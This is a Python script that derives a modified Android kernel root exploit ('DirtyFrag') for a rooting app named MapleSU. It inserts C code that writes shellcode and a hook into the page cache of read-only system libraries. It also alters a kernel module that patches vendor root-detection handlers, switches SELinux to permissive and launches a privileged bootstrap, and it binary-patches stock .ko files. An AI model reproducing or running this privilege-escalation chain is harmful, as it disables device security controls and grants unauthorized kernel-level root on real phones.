"""Deterministic MapleSU overlay for the pinned DirtyFrag sources.

Rules enforced here:

* the retained ``upstream/`` bytes are never modified; source edits are
  validated by transformation boundaries and build/tests, while retained
  kernel modules remain hash checked;
* every transformation is an explicit, counted, reviewable replacement - a
  changed upstream boundary aborts the whole overlay;
* nothing is published until every derived file has been produced in memory,
  and ``overlay.json`` is written last as the completion marker, so a failed
  run can never leave output that looks like a finished overlay.

The overlay owns three things: the native first stage (exact target binding and
no marker-derived readiness), the LKM (MapleSU bootstrap path plus reversible
transients) and the LKM artifact form (transient minimisation).  The LKM
artifact itself is the committed stock module: no offline kernel build inputs
exist for this tree, so a source rebuild stays an explicit open gate.
"""
import argparse
import hashlib
import json
import shutil
from pathlib import Path

ROOT = Path(__file__).resolve().parent

EXP = "app/src/main/jni/exp.c"
LKM = "lkm/dfroot.c"

# Symbol lookups the stock LKM performs against *vendor module* symbols and
# kallsyms.  Renaming them keeps the module's own "not found, skipping"
# behaviour, so the derived artifact introduces no OEM patch that MapleSU
# cannot reverse in the same boot.
KO_SYMBOLS = (
    b"oplus_exe_block_ret_handler",
    b"oplus_root_check_post_handler",
    b"task_defex_enforce",
    b"task_defex_user_exec",
)

# The committed module holds the privileged helper path in a fixed-width array
# (`static const char bootstrap[]`), so the replacement must not grow the string.
# The source overlay above uses the full MapleSU path for the rebuilt module; the
# shipped stock artifact can only carry this bounded equivalent. "bs" is the
# staged bootstrap inside the App's own data directory.
KO_BOOTSTRAP_ORIGINAL = b"/data/user_de/0/df.root/bootstrap\x00"
KO_BOOTSTRAP_REPLACEMENT = b"/data/data/dev.maplesu.manager/bs"


class OverlayError(ValueError):
    pass


def _replace(text, before, after, label):
    count = text.count(before)
    if count != 1:
        raise OverlayError(f"boundary changed ({count} matches): {label}")
    return text.replace(before, after)


def _replace_span(text, start_marker, end_marker, after, label):
    start = text.find(start_marker)
    if start < 0:
        raise OverlayError(f"span start missing: {label}")
    if text.find(start_marker, start + 1) >= 0:
        raise OverlayError(f"span start ambiguous: {label}")
    end = text.find(end_marker, start)
    if end < 0:
        raise OverlayError(f"span end missing: {label}")
    end += len(end_marker)
    return text[:start] + after + text[end:]


def derive_exp(text: str) -> str:
    # 1. Preserve the reference selector: exact Android KMI first, then the
    #    first packaged module with the same kernel major.minor. Runtime decides
    #    whether that module loads; the App does not veto an unlisted release.

    # 2. Exact release binding supplied by the App admission.
    text = _replace(text, "static uint32_t g_spi;\n",
                    "static uint32_t g_spi;\nstatic char     g_kernel_release[256];\n",
                    "release storage")
    text = _replace(
        text,
        '        else if (!strcmp(a, "--aes-key") && i + 1 < argc)\n'
        '            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;\n',
        '        else if (!strcmp(a, "--aes-key") && i + 1 < argc)\n'
        '            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;\n'
        '        else if (!strcmp(a, "--expect-release") && i + 1 < argc) {\n'
        '            const char *value = argv[++i];\n'
        '            if (strlen(value) >= sizeof(g_kernel_release)) { usage(argv[0]); return 2; }\n'
        '            strcpy(g_kernel_release, value);\n'
        '        }\n',
        "release argument")
    text = _replace(
        text,
        "    if (!encap_port || !sender_port || !spi || !have_aes) {\n",
        "    if (!encap_port || !sender_port || !spi || !have_aes || !g_kernel_release[0]) {\n",
        "release required")
    text = _replace(
        text,
        '            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\\n", argv0);\n',
        '            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX"\n'
        '            " --expect-release TEXT\\n", argv0);\n',
        "usage text")

    # 3. The 13 DirtyFragX milestones, in the reference order and with the
    #    reference rc mapping: a negative rc keeps waiting, a non-negative rc
    #    ends the attempt with exactly that value.  They are diagnostics only -
    #    no marker asserts privilege, restoration or readiness, because the App
    #    authenticates the lease, the daemon and the SU session separately.
    #    The only difference from the reference is the last hop: the bootstrap
    #    hands the attempt to the MapleSU root consumer instead of ksud, so
    #    only the dfm6/dfme2 wording names the consumer.
    stages = (
        "    /* MapleSU: the 13 DirtyFragX milestones, same names, same order and\n"
        "     * the same rc mapping as the reference implementation.  A negative\n"
        "     * rc keeps waiting; a non-negative rc ends the attempt with that\n"
        "     * value.  They are diagnostics only: the App authenticates the\n"
        "     * lease, the daemon and the SU session separately, so no marker\n"
        "     * stands in for readiness.\n"
        "     *\n"
        "     * Producers match the reference one for one, except that the last\n"
        "     * hop delivers the MapleSU consumer instead of ksud:\n"
        "     *   df, dfm0      libcxx.S shellcode / dfroot.ko   (unmodified)\n"
        "     *   dfm1..dfm6    the privileged bootstrap, in upstream step order\n"
        "     *   dfme0..dfme2  the bootstrap's fatal steps\n"
        "     *   dfmw0..dfmw1  the bootstrap's non-fatal steps\n"
        "     */\n"
        "    static const struct {\n"
        "        const char *path;\n"
        "        const char *msg;\n"
        "        int         rc;\n"
        "    } markers[] = {\n"
        '        { "/dev/df",    "libc++: loading custom module",                                  -1 },\n'
        '        { "/dev/dfm0",  "kernel module: launching bootstrap",                             -1 },\n'
        '        { "/dev/dfm1",  "bootstrap: loading the MapleSU attempt document",                -1 },\n'
        '        { "/dev/dfme0", "bootstrap: ERROR - the attempt document was rejected",            1 },\n'
        '        { "/dev/dfm2",  "bootstrap: attempt admitted, lease fields verified",             -1 },\n'
        '        { "/dev/dfmw0", "bootstrap: WARNING - pre-entry enforcing value unknown",         -1 },\n'
        '        { "/dev/dfm3",  "bootstrap: consumer executable bound",                           -1 },\n'
        '        { "/dev/dfmw1", "bootstrap: WARNING - state from a previous attempt found",       -1 },\n'
        '        { "/dev/dfm4",  "bootstrap: one-shot attempt document consumed",                  -1 },\n'
        '        { "/dev/dfme1", "bootstrap: ERROR - consuming the attempt document failed",        1 },\n'
        '        { "/dev/dfm5",  "bootstrap: starting the MapleSU root consumer",                   -1 },\n'
        '        { "/dev/dfm6",  "maplesu consumer: SUCCESS - bootstrap handed the attempt over",    0 },\n'
        '        { "/dev/dfme2", "maplesu consumer: ERROR - consumer exec failed",                   1 },\n'
        "    };\n"
        "    int seen[sizeof(markers) / sizeof(markers[0])] = {0};\n"
        "\n"
        "    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {\n"
        "        usleep(10000);\n"
        "        for (size_t j = 0; j < sizeof(markers) / sizeof(markers[0]); j++) {\n"
        "            if (!seen[j] && access(markers[j].path, F_OK) == 0) {\n"
        "                seen[j] = 1;\n"
        '                printf("%s\\n", markers[j].msg);\n'
        "                if (markers[j].rc >= 0) {\n"
        "                    /* Consume only the terminal marker, so a later\n"
        "                     * attempt cannot inherit this outcome.  /dev/df is\n"
        "                     * the libc++ re-entry guard and /dev/dfm0 is the\n"
        "                     * App's verdict marker: never unlinked here, only\n"
        "                     * the consumer removes them after the disarm. */\n"
        "                    (void)unlink(markers[j].path);\n"
        "                    rc = markers[j].rc;\n"
        "                    goto done;\n"
        "                }\n"
        "            }\n"
        "        }\n"
        "    }\n"
        '    printf("timeout: ERROR - check logcat & dmesg\\n");\n'
    )
    # The span closes on the upstream timeout line, so the reference rc (the 2
    # set before the wait) is what a timeout still returns.
    text = _replace_span(text, "    static const struct {\n",
                         '    printf("timeout: ERROR - check logcat & dmesg\\n");\n', stages,
                         "result table")

    # 4. Refuse to run against a different running kernel than the admitted one.
    text = _replace(
        text,
        "int main(int argc, char **argv) {\n",
        "/* Exact target binding: the App admits one full release; a different\n"
        " * running kernel is refused before the first native stage. */\n"
        "static int maplesu_require_exact_release(void)\n"
        "{\n"
        "    struct utsname u;\n"
        "    if (uname(&u) != 0) {\n"
        "        printf(\"exact target: uname failed: %s\\n\", strerror(errno));\n"
        "        return -1;\n"
        "    }\n"
        "    if (strcmp(u.release, g_kernel_release)) {\n"
        "        printf(\"exact target mismatch: running %s admitted %s\\n\", u.release, g_kernel_release);\n"
        "        return -1;\n"
        "    }\n"
        "    return 0;\n"
        "}\n"
        "\n"
        "int main(int argc, char **argv) {\n",
        "release helper")
    text = _replace(text, "    if (setup(argc, argv) != 0) return 2;\n    int rc = exploit();\n",
                    "    if (setup(argc, argv) != 0) return 2;\n"
                    "    if (maplesu_require_exact_release()) return 64;\n"
                    "    int rc = exploit();\n",
                    "release gate")

    # 5. Verified content restoration.  The primitive only ever changes the page
    #    cache of read-only files, so the bytes read before the patch are the
    #    only thing that can put a file back; a successful write is not evidence
    #    that the page holds them again, so every region is re-read and compared
    #    and the failure count is published for the App to act on.
    text = _replace(
        text,
        "static void cleanup(void) {\n",
        "/* MapleSU: content-level restoration with readback verification. */\n"
        "struct RestoreRegion {\n"
        "    const char *path;\n"
        "    size_t off;\n"
        "    size_t len;\n"
        "    char *orig;\n"
        "    int helper;\n"
        "    int valid;\n"
        "};\n"
        "\n"
        "static struct RestoreRegion g_regions[4];\n"
        "static int g_region_count;\n"
        "static int g_restore_failures;\n"
        "\n"
        "/* Snapshot the bytes a patch is about to replace.  Without this the\n"
        " * original content is unrecoverable: reading the file afterwards returns\n"
        " * the modified page cache, not the on-disk original. */\n"
        "static void snapshot_region(const char *path, size_t off, size_t len, int helper) {\n"
        "    if (g_region_count >= (int)(sizeof(g_regions) / sizeof(g_regions[0]))) return;\n"
        "    struct RestoreRegion *region = &g_regions[g_region_count];\n"
        "    region->path = path;\n"
        "    region->off = off;\n"
        "    region->len = len;\n"
        "    region->helper = helper;\n"
        "    region->valid = 0;\n"
        "    region->orig = malloc(len);\n"
        "    if (!region->orig) {\n"
        "        printf(\"restore: %s snapshot alloc failed\\n\", path);\n"
        "        ++g_restore_failures;\n"
        "        return;\n"
        "    }\n"
        "    int fd = open(path, O_RDONLY);\n"
        "    ssize_t n = fd < 0 ? -1 : pread(fd, region->orig, len, (off_t)off);\n"
        "    if (fd >= 0) close(fd);\n"
        "    /* A vendor page is unreadable from the App UID; the same bridge that\n"
        "     * writes it is the only way to read it back, 16 bytes at a time. */\n"
        "    if (helper && (n != (ssize_t)len)) {\n"
        "        n = 0;\n"
        "        for (size_t i = 0; i < len; i += 16) {\n"
        "            if (read_vendor_content((off_t)(off + i), (uint8_t *)(region->orig + i)) < 0) break;\n"
        "            n += 16;\n"
        "        }\n"
        "    }\n"
        "    if (n != (ssize_t)len) {\n"
        "        printf(\"restore: %s snapshot failed (%zd)\\n\", path, n);\n"
        "        free(region->orig);\n"
        "        region->orig = NULL;\n"
        "        ++g_restore_failures;\n"
        "        return;\n"
        "    }\n"
        "    region->valid = 1;\n"
        "    ++g_region_count;\n"
        "}\n"
        "\n"
        "static void restore_region(struct RestoreRegion *region) {\n"
        "    if (!region->valid) return;\n"
        "    int rc = patch_file_cbc(region->path, region->orig, region->len, region->off, region->helper);\n"
        "    if (rc) {\n"
        "        printf(\"restore: %s write failed: %d\\n\", region->path, rc);\n"
        "        ++g_restore_failures;\n"
        "        return;\n"
        "    }\n"
        "    char *check = malloc(region->len);\n"
        "    if (!check) { ++g_restore_failures; return; }\n"
        "    int fd = open(region->path, O_RDONLY);\n"
        "    ssize_t n = fd < 0 ? -1 : pread(fd, check, region->len, (off_t)region->off);\n"
        "    if (fd >= 0) close(fd);\n"
        "    if (n != (ssize_t)region->len || memcmp(check, region->orig, region->len) != 0) {\n"
        "        printf(\"restore: %s MISMATCH after write-back\\n\", region->path);\n"
        "        ++g_restore_failures;\n"
        "    } else {\n"
        "        printf(\"restore: %s verified (%zu bytes @ %zu)\\n\",\n"
        "               region->path, region->len, region->off);\n"
        "    }\n"
        "    free(check);\n"
        "}\n"
        "\n"
        "static void cleanup(void) {\n",
        "restore infrastructure")
    text = _replace(
        text,
        "    if (!g_libcxx_r.valid) return;\n"
        "    printf(\"\\n=== cleanup ===\\n\");\n"
        "    printf(\"restoring trampoline in %s\\n\", g_libcxx_r.lib);\n"
        "    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,\n"
        "                   (size_t)g_libcxx_r.tramp_aligned, 0);\n"
        "    printf(\"restoring shellcode in %s\\n\", g_libcxx_r.lib);\n"
        "    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,\n"
        "                   (size_t)g_libcxx_r.shell_off, 0);\n",
        "    printf(\"\\n=== cleanup (verified content restoration) ===\\n\");\n"
        "    /* The injected hook is the only region whose original bytes are held\n"
        "     * in a struct, so it is restored through the same verified path. */\n"
        "    /* Diagnostic switch (2026-10-28): with this file present the stage skips the\n"
        "     * in-place page restores and leaves them to the mandatory soft reboot, which\n"
        "     * is what the reference implementation relies on. It isolates whether the\n"
        "     * restore writes are what destabilise this kernel. */\n"
        "    int skip_restore = access(\"/data/user_de/0/dev.maplesu.manager/no-restore\", F_OK) == 0;\n"
        "    if (skip_restore) printf(\"maplesu-restore: skipped by request\\n\");\n"
        "    if (g_libcxx_r.valid && !skip_restore) {\n"
        "        struct RestoreRegion trampoline = { g_libcxx_r.lib,\n"
        "            (size_t)g_libcxx_r.tramp_aligned, 16,\n"
        "            (char *)g_libcxx_r.tramp_orig, 0, 1 };\n"
        "        struct RestoreRegion shellcode = { g_libcxx_r.lib,\n"
        "            (size_t)g_libcxx_r.shell_off, (size_t)g_libcxx_r.shell_padded,\n"
        "            (char *)g_libcxx_r.shell_orig, 0, 1 };\n"
        "        printf(\"restoring hook in %s\\n\", g_libcxx_r.lib);\n"
        "        restore_region(&trampoline);\n"
        "        restore_region(&shellcode);\n"
        "    }\n"
        "    /* Reverse order: the vendor page is written through the crash_dump64\n"
        "     * helper, so the helper must still hold the splice code when the\n"
        "     * vendor region is restored. */\n"
        "    if (!skip_restore)\n"
        "        for (int i = g_region_count - 1; i >= 0; --i) restore_region(&g_regions[i]);\n"
        "    printf(\"maplesu-restore: failures=%d\\n\", g_restore_failures);\n"
        "    /* Disarm handshake: the guard file the native stage installs keeps the\n"
        "     * hook from re-firing.  It can only be removed once this stage has\n"
        "     * provably restored the library, so the privileged side waits for this\n"
        "     * file instead of racing a timer. */\n"
        "    if (g_restore_failures == 0) {\n"
        "        const char *disarmed = \"/data/user_de/0/dev.maplesu.manager/maplesu-disarmed\";\n"
        "        int fd = open(disarmed, O_WRONLY | O_CREAT | O_TRUNC, 0644);\n"
        "        if (fd >= 0) {\n"
        "            ssize_t written = write(fd, \"ok\", 2);\n"
        "            close(fd);\n"
        "            printf(\"maplesu-disarm: %s\\n\", written == 2 ? \"published\" : \"short write\");\n"
        "        } else {\n"
        "            /* The privileged side waits for this file, so a refused create\n"
        "             * must never be silent: report errno instead of timing out. */\n"
        "            printf(\"maplesu-disarm: open failed errno=%d\\n\", errno);\n"
        "        }\n"
        "    }\n",
        "verified cleanup")
    # Removal of the earlier watchdog (2026-10-27): calling cleanup() from the
    # hook-trigger fork restored the libc++ hook one second after it was armed, so
    # init could no longer hit it and the module was never dispatched. Upstream
    # lets the parent's cleanup() own the restoration; a hard-killed attempt is
    # handled on the App side by eviction plus an explicit stale refusal.
    text = _replace(
        text,
        "/* Write splicehelper into crash_dump64 page cache. */\n",
        "/* Defined below; every patch site snapshots its region first. */\n"
        "static void snapshot_region(const char *path, size_t off, size_t len, int helper);\n"
        "\n"
        "/* Write splicehelper into crash_dump64 page cache. */\n",
        "snapshot declaration")
    text = _replace(
        text,
        "    printf(\"patch: crash_dump64 <- splicehelper (%zu bytes)\\n\", len);\n",
        "    snapshot_region(kCrashDump, 0, len, 0);\n"
        "    printf(\"patch: crash_dump64 <- splicehelper (%zu bytes)\\n\", len);\n",
        "helper snapshot")
    text = _replace(
        text,
        "    printf(\"patch: %s <- dfroot.ko (%zu bytes)\\n\", libcxx_ko_target, len);\n",
        "    /* The vendor page is not readable from the App UID, so there is no\n"
        "     * snapshot to write back. It is left to the kernel: once the dirty page\n"
        "     * is dropped the read-only file serves its on-disk original again, and\n"
        "     * the privileged side forces that drop after the handshake. */\n"
        "    printf(\"restore: %s is evict-only (unreadable from the App UID)\\n\",\n"
        "           libcxx_ko_target);\n"
        "    printf(\"patch: %s <- dfroot.ko (%zu bytes)\\n\", libcxx_ko_target, len);\n",
        "ko evict-only")
    # 6. Attempt-scoped marker hygiene.  The reference chain reboots after a
    #    successful handoff, so its /dev markers disappear with the tmpfs; this
    #    chain does not reboot, and a leftover dfm6 would be read as this
    #    attempt's success before the module is ever dispatched, while a
    #    leftover dfme* would end a healthy attempt early.  Only the bootstrap's
    #    own markers are cleared here: /dev/df and /dev/dfm0 belong to the App's
    #    attempt verdict and are removed by the consumer after the disarm proof.
    text = _replace(
        text,
        "static int exploit(void) {\n"
        '    printf("\\n=== exploit (patching files) ===\\n");\n',
        "/* MapleSU: attempt-scoped marker hygiene.  The bootstrap's markers are\n"
        " * created once per attempt and the consumer does not remove dfm6, so a\n"
        " * survivor must never be attributed to a later attempt. */\n"
        "static void maplesu_clear_marker_state(void) {\n"
        "    static const char *const markers[] = {\n"
        '        "/dev/dfm1", "/dev/dfm2", "/dev/dfm3",\n'
        '        "/dev/dfm4", "/dev/dfm5", "/dev/dfm6",\n'
        '        "/dev/dfme0", "/dev/dfme1", "/dev/dfme2",\n'
        '        "/dev/dfmw0", "/dev/dfmw1"};\n'
        "    for (size_t i = 0; i < sizeof(markers) / sizeof(markers[0]); ++i)\n"
        "        (void)unlink(markers[i]);\n"
        "}\n"
        "\n"
        "static int exploit(void) {\n"
        "    maplesu_clear_marker_state();\n"
        '    printf("\\n=== exploit (patching files) ===\\n");\n',
        "marker hygiene")

    # 7. Read-after-write diagnostics.  The primitive only queues UDP frames
    #    into the target's page cache, so a successful return is not evidence
    #    that the bytes landed.  Each patch site reads its first 16 bytes back
    #    and prints match=<0|1>; the line is diagnostic only, and the upstream
    #    control flow, return codes and restore behaviour stay unchanged.
    verify_helper = (
        "/* MapleSU: read-after-write diagnostics for one patch site.  The patch\n"
        " * primitive writes coalesced UDP frames into the target's page cache,\n"
        " * so a zero return only means the frames were sent.  This reads the\n"
        " * first 16 bytes back through the ordinary VFS path and prints\n"
        " * match=<0|1>.  It never changes control flow: a mismatch is evidence\n"
        " * to collect, not a new failure mode.  helper=1 marks the vendor page\n"
        " * the App UID cannot read, where match=0 with EACCES is expected. */\n"
        "static void maplesu_verify(const char *path, size_t off,\n"
        "                           const void *expected, size_t length, int helper) {\n"
        "    unsigned char readback[16];\n"
        "    if (length > sizeof(readback)) length = sizeof(readback);\n"
        "    int fd = open(path, O_RDONLY);\n"
        "    ssize_t got = fd < 0 ? -1 : pread(fd, readback, length, (off_t)off);\n"
        "    int saved = errno;\n"
        "    if (fd >= 0) close(fd);\n"
        "    const int match = got == (ssize_t)length &&\n"
        "        memcmp(readback, expected, length) == 0;\n"
        '    printf("verify: %s +0x%zx match=%d\\n", path, off, match ? 1 : 0);\n'
        "    if (!match)\n"
        '        printf("verify: %s +0x%zx readback=%zd errno=%d helper=%d\\n",\n'
        "               path, off, got, got < 0 ? saved : 0, helper);\n"
        "}\n"
        "\n"
    )
    text = _replace(text, "static int patch_ko(void) {\n",
                    verify_helper + "static int patch_ko(void) {\n", "verify helper")
    text = _replace(
        text,
        "    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);\n"
        "    free(buf);\n",
        "    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);\n"
        "    maplesu_verify(libcxx_ko_target, 0, buf, 16, 1);\n"
        "    free(buf);\n",
        "verify ko")
    text = _replace(
        text,
        "    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);\n"
        "    free(buf);\n",
        "    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);\n"
        "    maplesu_verify(lib, (size_t)shell_off, buf, 16, 0);\n"
        "    free(buf);\n",
        "verify shellcode")
    text = _replace(
        text,
        "    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);\n",
        "    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);\n"
        "    maplesu_verify(lib, (size_t)aligned, blk, 16, 0);\n",
        "verify trampoline")
    return text


def derive_lkm(text: str) -> str:
    # 1. The kernel helper is dispatched by call_usermodehelper with an
    #    absolute path, so the MapleSU attempt directory replaces the vendor one.
    text = _replace(text, '"/data/user_de/0/df.root/bootstrap"',
                    '"/data/user_de/0/dev.maplesu.manager/maplesu-bootstrap"', "bootstrap path")

    # 2. Reversible transients.  The stock module patches vendor handlers and
    #    SELinux state and then unloads, so nothing can undo them.  The derived
    #    module captures every original before writing it, stays loaded, and
    #    restores from module exit - which the MapleSU consumer triggers only
    #    after the authenticated handoff exists.
    text = _replace(
        text,
        "static insn_patch_t insn_patch_text;\n",
        "static insn_patch_t insn_patch_text;\n"
        "\n"
        "/*\n"
        " * MapleSU restore contract: every kernel-side transient is captured before\n"
        " * it is written and reversed in module exit.  Module exit runs only after\n"
        " * the root consumer has authenticated the lease with the Manager.\n"
        " */\n"
        "#define DFROOT_MAX_PATCHES 4\n"
        "struct dfroot_patch_site {\n"
        "    void *addrs[2];\n"
        "    u32   original[2];\n"
        "};\n"
        "static struct dfroot_patch_site dfroot_sites[DFROOT_MAX_PATCHES];\n"
        "static int dfroot_site_count;\n"
        "static bool *dfroot_selinux_state;\n"
        "static bool dfroot_selinux_original;\n"
        "static bool dfroot_selinux_captured;\n"
        "\n"
        "static void __nocfi dfroot_exit(void);\n",
        "restore state")

    text = _replace(
        text,
        "    if (insn_patch_text(addrs, insns, 2))\n"
        '        pr_warn("dfroot: patch failed at %px\\n", fn);\n'
        "}\n",
        "    if (dfroot_site_count >= DFROOT_MAX_PATCHES) {\n"
        '        pr_warn("dfroot: restore table full at %px\\n", fn);\n'
        "        return;\n"
        "    }\n"
        "    dfroot_sites[dfroot_site_count].addrs[0] = addrs[0];\n"
        "    dfroot_sites[dfroot_site_count].addrs[1] = addrs[1];\n"
        "    dfroot_sites[dfroot_site_count].original[0] = *(u32 *)addrs[0];\n"
        "    dfroot_sites[dfroot_site_count].original[1] = *(u32 *)addrs[1];\n"
        "    if (insn_patch_text(addrs, insns, 2)) {\n"
        '        pr_warn("dfroot: patch failed at %px\\n", fn);\n'
        "        return;\n"
        "    }\n"
        "    ++dfroot_site_count;\n"
        "}\n",
        "patch capture")

    text = _replace(
        text,
        "    WRITE_ONCE(*selinux_state, false);\n"
        '    pr_info("dfroot: selinux_state permissive\\n");\n',
        "    dfroot_selinux_state = selinux_state;\n"
        "    dfroot_selinux_original = *(bool *)selinux_state;\n"
        "    dfroot_selinux_captured = true;\n"
        "    WRITE_ONCE(*selinux_state, false);\n"
        '    pr_info("dfroot: selinux_state permissive, original=%d\\n",\n'
        "            dfroot_selinux_original ? 1 : 0);\n",
        "selinux capture")

    text = _replace(
        text,
        "    if (!umh_setup || !umh_exec) {\n"
        '        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\\n",\n'
        "               umh_setup, umh_exec);\n"
        "        return -EINVAL;\n"
        "    }\n",
        "    if (!umh_setup || !umh_exec) {\n"
        '        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\\n",\n'
        "               umh_setup, umh_exec);\n"
        "        goto restore_fail;\n"
        "    }\n",
        "umh setup failure")

    text = _replace(
        text,
        "    if (!info) {\n"
        '        pr_err("dfroot: usermodehelper_setup: returned NULL\\n");\n'
        "        return -EINVAL;\n"
        "    }\n",
        "    if (!info) {\n"
        '        pr_err("dfroot: usermodehelper_setup: returned NULL\\n");\n'
        "        goto restore_fail;\n"
        "    }\n",
        "umh info failure")

    text = _replace(
        text,
        "    ret = umh_exec(info, UMH_WAIT_EXEC);\n"
        '    pr_info("dfroot: usermodehelper_exec returned %d\\n", ret);\n'
        "    \n"
        "    return -ENODEV; /* return any error to unload module */\n"
        "}\n"
        "\n"
        "/* no module_exit: we never unload; saves .exit sections */\n"
        "module_init(dfroot_init);\n",
        "    ret = umh_exec(info, UMH_WAIT_EXEC);\n"
        '    pr_info("dfroot: usermodehelper_exec returned %d\\n", ret);\n'
        "\n"
        "    /*\n"
        "     * Stay loaded.  The MapleSU consumer unloads this module after the\n"
        "     * lease is authenticated, which is what restores the transients.\n"
        "     */\n"
        "    return 0;\n"
        "\n"
        "restore_fail:\n"
        "    dfroot_exit();\n"
        "    return -EINVAL;\n"
        "}\n"
        "\n"
        "static void __nocfi dfroot_exit(void)\n"
        "{\n"
        "    int i;\n"
        "    for (i = dfroot_site_count - 1; i >= 0; --i) {\n"
        "        if (insn_patch_text(dfroot_sites[i].addrs, dfroot_sites[i].original, 2))\n"
        '            pr_warn("dfroot: restore failed at %px\\n", dfroot_sites[i].addrs[0]);\n'
        "        else\n"
        '            pr_info("dfroot: restored %px\\n", dfroot_sites[i].addrs[0]);\n'
        "    }\n"
        "    dfroot_site_count = 0;\n"
        "    if (dfroot_selinux_captured && dfroot_selinux_state) {\n"
        "        WRITE_ONCE(*dfroot_selinux_state, dfroot_selinux_original);\n"
        '        pr_info("dfroot: selinux_state restored to %d (now %d)\\n",\n'
        "                dfroot_selinux_original ? 1 : 0,\n"
        "                *(bool *)dfroot_selinux_state ? 1 : 0);\n"
        "        dfroot_selinux_captured = false;\n"
        "    }\n"
        '    pr_info("dfroot: restore complete\\n");\n'
        "}\n"
        "\n"
        "module_init(dfroot_init);\n"
        "module_exit(dfroot_exit);\n",
        "module lifetime")
    return text


def derive_ko_minimal(raw: bytes) -> bytes:
    """Same-size transforms of the committed module.

    * symbol rename: the module keeps its own "not found, skipping" path, so it
      applies no OEM text patch that MapleSU would have to reverse;
    * helper path: the kernel-dispatched helper becomes the App-owned bootstrap
      instead of another package's directory.
    """
    data = raw
    # 2026-10-28 (second round): the renames are re-enabled. With ART suppressed the
    # kernel stayed up, and with the stock names the module patches the vendor
    # handler sites it was compiled for; on this build those sites only sometimes
    # match, and executing the patched code panics the kernel. Renaming the lookups
    # makes the module take its own "not found, skipping" path and leaves the vendor
    # text untouched, which is the safe shape while the root session runs ART.
    for symbol in KO_SYMBOLS:
        needle = symbol + b"\0"
        if data.count(needle) != 1:
            raise OverlayError("KO symbol boundary changed: " + symbol.decode())
        data = data.replace(needle, b"x" + needle[1:])
    if data.count(KO_BOOTSTRAP_ORIGINAL) != 1:
        raise OverlayError("KO helper path boundary changed")
    replacement = KO_BOOTSTRAP_REPLACEMENT + b"\0"
    if len(replacement) > len(KO_BOOTSTRAP_ORIGINAL):
        raise OverlayError("KO helper path replacement is too long")
    replacement = replacement.ljust(len(KO_BOOTSTRAP_ORIGINAL), b"\0")
    data = data.replace(KO_BOOTSTRAP_ORIGINAL, replacement)
    if len(data) != len(raw):
        raise OverlayError("KO size changed")
    return data


def _inputs(root):
    root = Path(root)
    manifest = json.loads((root / "source-manifest.json").read_text(encoding="utf-8-sig"))
    records = {item["path"]: item for item in manifest["files"]}
    return manifest, records


def _read_input(root, records, relative):
    record = records["upstream/" + relative]
    raw = (root / "upstream" / relative).read_bytes()
    if relative.startswith("stock-artifacts/ko/") and (
            hashlib.sha256(raw).hexdigest() != record["sha256"] or len(raw) != record["bytes"]):
        raise OverlayError("retained binary identity mismatch: " + relative)
    return record, raw


def derive(output, root=ROOT):
    root = Path(root).resolve()
    output = Path(output).resolve()
    if output.is_relative_to(root):
        raise OverlayError("overlay output must be outside retained provider sources")
    manifest, records = _inputs(root)
    staged = {}
    files = {}

    for relative in (EXP, LKM):
        record, raw = _read_input(root, records, relative)
        text = raw.decode("utf-8")
        derived = derive_exp(text) if relative == EXP else derive_lkm(text)
        data = derived.encode("utf-8")
        staged[relative] = data
        files[relative] = {
            "upstreamSha256": hashlib.sha256(raw).hexdigest(),
            "derivedSha256": hashlib.sha256(data).hexdigest(),
            "bytes": len(data),
        }

    for stock_ko in sorted(records):
        if not stock_ko.startswith("upstream/stock-artifacts/ko/") or not stock_ko.endswith(".ko"):
            continue
        stock_record, stock_raw = _read_input(root, records, stock_ko.removeprefix("upstream/"))
        minimal = derive_ko_minimal(stock_raw)
        name = "artifacts/" + Path(stock_ko).stem + ".minimal.ko"
        staged[name] = minimal
        files[name] = {
            "upstreamSha256": stock_record["sha256"],
            "derivedSha256": hashlib.sha256(minimal).hexdigest(),
            "bytes": len(minimal),
            "origin": "STOCK_BINARY_TRANSFORM",
            "sourceRebuilt": False,
        }

    # Publish atomically: build beside the destination, mark completion, swap.
    staging = output.with_name(output.name + ".incomplete")
    if staging.exists():
        shutil.rmtree(staging)
    staging.mkdir(parents=True)
    for relative, data in staged.items():
        target = staging / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(data)
    marker = {
        "complete": True,
        "upstreamCommit": manifest["sourceCommit"],
        "sourceRepository": manifest["sourceRepository"],
        "contract": "TRANSIENT_PROVIDER_RESTORE_V1",
        "derivedKoSourceRebuilt": False,
        "derivedKoTransforms": [
            "symbol-lookup-rename: " + ",".join(symbol.decode() for symbol in KO_SYMBOLS),
            "helper-path: " + KO_BOOTSTRAP_REPLACEMENT.decode(),
        ],
        "derivedKoNote": "Each retained stock module has its helper path redirected "
                         "to MapleSU and its transient set minimised. These are "
                         "binary transforms, not source rebuilds.",
        "files": files,
    }
    (staging / "overlay.json").write_text(json.dumps(marker, indent=2) + "\n", encoding="utf-8")
    if output.exists():
        shutil.rmtree(output)
    staging.rename(output)
    return files


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", type=Path, required=True)
    print(json.dumps(derive(parser.parse_args().output), indent=2))
